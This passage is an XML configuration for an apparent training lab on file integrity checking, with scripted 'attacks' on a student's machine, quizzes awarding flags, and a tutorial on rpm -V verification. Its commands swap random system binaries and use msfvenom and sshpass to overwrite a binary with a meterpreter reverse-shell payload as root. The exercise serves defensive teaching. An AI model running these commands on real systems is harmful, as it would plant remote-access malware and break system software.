		<post_command>mv1=`find /bin/ /usr/bin/ -executable | sort -R | head -n 1`; mv2=`find /bin/ /usr/bin/ -executable | sort -R | head -n 1`; mv $mv1 $mv1.tmp; mv $mv2 $mv1; mv $mv1.tmp $mv2; echo $mv1 $mv2</post_command>
		<suppress_command_output_feedback />

		<condition>
			<output_matches>/etc.*</output_matches>
			<message>Good. Now answer this...</message>
			<trigger_quiz />
		</condition>
		<condition>
			<output_matches>Permission denied|Operation not permitted|Read-only</output_matches>
			<message>:( You stopped the attack, rather than monitor for changes... We need to be able to write to /secrets/something_secret/</message>
		</condition>
		<else_condition>
			<message>:( Something was not right... We are trying to write to /secrets/something_secret</message>
		</else_condition>

		<quiz>
			<question>What is the file that was created?</question>
			<answer>{{post_command_output}}</answer>
			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
			<trigger_next_attack />
		</quiz>
	</attack>

	<!--copied a new random file in /etc/ use hash comparisons to find the filename (hint: sha1deep, hashdeep, or shasum) -->
	<!--TODO test this-->
	<attack>
		<!--<topic>File integrity checkers</topic>-->
		<prompt>Going to copy a new random file in /etc/ use hash comparisons to find the filename (hint: sha1deep, hashdeep, or shasum)</prompt>
		<post_command>srcf=`find /etc/ -type f | sort -R | head -n 1`; cp $srcf $srcf.$RANDOM</post_command>
		<suppress_command_output_feedback />

		<condition>
			<output_matches>/etc.*</output_matches>
			<message>Good. Now answer this...</message>
			<trigger_quiz />
		</condition>
		<condition>
			<output_matches>Permission denied|Operation not permitted|Read-only</output_matches>
			<message>:( You stopped the attack, rather than monitor for changes... We need to be able to write to /secrets/something_secret/</message>
		</condition>
		<else_condition>
			<message>:( Something was not right... We are trying to write to /secrets/something_secret</message>
		</else_condition>

		<quiz>
			<question>What is the file that was created?</question>
			<answer>{{post_command_output}}</answer>
			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
			<trigger_next_attack />
		</quiz>
	</attack>

	<!--trojanising a file in /usr/bin/, use hash comparisons to detect which file changes-->
	<!--TODO test this-->
	<attack>
		<!--<topic>File integrity checkers</topic>-->
		<get_shell>binname=`find /bin/ /usr/bin/ -executable | sort -R | head -n 1`; echo $binname; msfvenom -a -x86 --platform linux -p linux/x86/meterpreter_reverse_tcp --payload-options -f elf -o msfout; sshpass -p <%= $root_password %> scp -oStrictHostKeyChecking=no ./msfout root@{{chat_ip_address}}:$binname</get_shell>

		<prompt>Going to replace a binary file in /bin/ or /usr/bin/ with malware, detect which file has changed (hint: sha1deep, hashdeep, or shasum)</prompt>
		<!--<post_command></post_command>-->
		<!--<suppress_command_output_feedback />-->

		<!--<condition>-->
			<!--<output_matches>/etc.*</output_matches>-->
			<!--<message>Good. Now answer this...</message>-->
			<!--<trigger_quiz />-->
		<!--</condition>-->
		<!--<condition>-->
			<!--<output_matches>Permission denied|Operation not permitted|Read-only</output_matches>-->
			<!--<message>:( You stopped the attack, rather than monitor for changes... We need to be able to write to /secrets/something_secret/</message>-->
		<!--</condition>-->
		<!--<else_condition>-->
			<!--<message>:( Something was not right... We are trying to write to /secrets/something_secret</message>-->
		<!--</else_condition>-->

		<quiz>
			<question>What is the file that was created?</question>
			<answer>{{shell_command_output_first_line}}</answer>
			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
			<trigger_next_attack />
		</quiz>
		<tutorial>
#### Detecting changes to resources using package management

On Linux systems, package management systems are used to organise,
install, and update software. The package management system has a
database that keeps track of all the files for each program or software
package. Depending on the package management system used, the database
may maintain hashes in order to detect changes to files since install.
RPM-based systems (such as Red Hat, Fedora, and OpenSUSE), store hashes
of each file that is included in software packages. There are commands
that can be used to detect changes to files that have occurred since
being installed by the package management software.

Note that there are times where it is perfectly normal for a number of
files to not match the “fresh” versions that were installed: for
example, configuring a system for use will involve editing configuration
files that were distributed with software packages.

The “rpm” command has a -V flag for verifying the integrity of packages.

Choose any system file on the computer, such as /etc/securetty. To
determine which package the file belongs to:

> rpm -q --whatprovides *any-file-you-chose*
>
> Where any-file-you-chose is any file such as /etc/securetty.

The output of that command the package-name, and is required in the next
step.

Check the integrity of the file:

> rpm -V *package-name*
>
> Where package-name is the output from the previous command.

An example from the output would be:

> 5S.T..... c /etc/securetty

Which means, it is a config file (c), and:

-   S – file Size differs

-   M – Mode differs (includes permissions and file type)

-   5 – MD5 sum differs

-   D – Device major/minor number mismatch

-   L – readLink(2) path mismatch

-   U – User ownership differs

-   G – Group ownership differs

-   T – mTime differs

-   P – caPabilities differ

Use the above information to understand the output from your above rpm
-V command.

Next verify the integrity of all of the packages on the entire system
(this may take a while):

> rpm -Va

Try to understand the cause of any files failing the integrity checks.

Consider the limitations of this approach: what files will (and won’t)
this approach to integrity management cover?

#### Limitations of integrity checking

Perhaps the greatest limitation to all of these approaches, is that if a
system is compromised, you may not be able to trust any of the tools on
the system, or even the operating system itself to behave as expected.
In the case of a security compromise, your configuration files may have
been altered, including any hashes you have stored locally, and tools
may have been replaced by Trojan horses. For this reason it is safer to
run tools over the network or from a removable drive, with read-only
access to protect your backups and hashes. Even then, the
OS/kernel/shell may not be telling you the truth about what is
happening, since a rootkit could be concealing the truth from other
programs.
		</tutorial>
	</attack>

	<!--trojanising a file in /usr/bin/, use package management to detect which file changes-->
	<attack>
		<!--<topic>File integrity checkers</topic>-->
		<get_shell>binname=`find /bin/ /usr/bin/ -executable | sort -R | head -n 1`; echo $binname; msfvenom -a -x86 --platform linux -p linux/x86/meterpreter_reverse_tcp --payload-options -f elf -o msfout; sshpass -p <%= $root_password %> scp -oStrictHostKeyChecking=no ./msfout root@{{chat_ip_address}}:$binname</get_shell>

		<prompt>Trojanising a file in /usr/bin/, use package management to detect which file changes</prompt>
		<!--<post_command></post_command>-->
		<!--<suppress_command_output_feedback />-->

		<!--<condition>-->
		<!--<output_matches>/etc.*</output_matches>-->
		<!--<message>Good. Now answer this...</message>-->
		<!--<trigger_quiz />-->
		<!--</condition>-->
		<!--<condition>-->
		<!--<output_matches>Permission denied|Operation not permitted|Read-only</output_matches>-->
		<!--<message>:( You stopped the attack, rather than monitor for changes... We need to be able to write to /secrets/something_secret/</message>-->
		<!--</condition>-->
		<!--<else_condition>-->
		<!--<message>:( Something was not right... We are trying to write to /secrets/something_secret</message>-->
		<!--</else_condition>-->

		<quiz>
			<question>What is the file that was created?</question>
			<answer>{{shell_command_output_first_line}}</answer>
			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
			<trigger_next_attack />
		</quiz>
	</attack>


</hackerbot>
